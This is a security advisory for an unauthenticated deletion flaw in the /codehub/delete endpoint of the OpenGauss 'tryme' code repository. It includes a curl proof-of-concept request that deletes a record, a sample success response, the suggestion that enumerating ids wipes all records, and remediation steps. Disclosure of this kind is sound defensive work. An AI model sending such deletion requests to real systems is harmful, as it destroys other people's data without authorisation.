# huawei Unauthorized Arbitrary Data Deletion Vulnerability (tryme-master / Zeus OpenGauss SQL Code Repository)

## Vulnerability Overview

An unauthorized arbitrary data deletion vulnerability exists in the Zeus OpenGauss SQL Code Repository (tryme-master) ([GitHub repository](https://github.com/opengauss-mirror/tryme)). An attacker can delete any code repository record in the system through a specific interface without authentication, resulting in severe business impact and data loss.

## Affected Versions

- Zeus OpenGauss SQL Code Repository (tryme-master)
- Affected endpoint: `/codehub/delete`
### Submitter
- yudeshui

## Vulnerability Description

The `/codehub/delete` endpoint lacks authentication and authorization checks. An attacker can directly send POST requests with an arbitrary `id` parameter to delete any code repository record in the system, without any login or permission verification.

## Proof of Concept

1. Start the Zeus OpenGauss SQL Code Repository backend service (listening on port 9002).
2. Access the following endpoint directly, without any authentication:
   ```
   curl -X POST "http://localhost:9002/codehub/delete" -d "id=1" -H "Content-Type: application/x-www-form-urlencoded"
   ```
3. If id=1 exists, the endpoint returns a success message:
   ```json
   {
     "success": true,
     "message": "成功",
     "code": 200,
     "result": null,
     "timestamp": 1765456241506
   }
   ```
4. By enumerating the `id` parameter, an attacker can delete all code repository records in the system.

## Impact Analysis

- An attacker can arbitrarily delete all code repository data in the system, causing severe business disruption and data loss.
- This vulnerability can be exploited remotely by any unauthenticated user, with no restrictions.

## Remediation

- Remove the `@PassToken` annotation and enforce authentication for the `/codehub/delete` endpoint and all other endpoints involving data modification or deletion.
- Implement proper authorization checks to ensure that only authorized users can delete their own or permitted data.
- Review all other endpoints with `@PassToken` to prevent similar unauthorized access vulnerabilities.


## References

- Official GitHub repository: https://github.com/opengauss-mirror/tryme

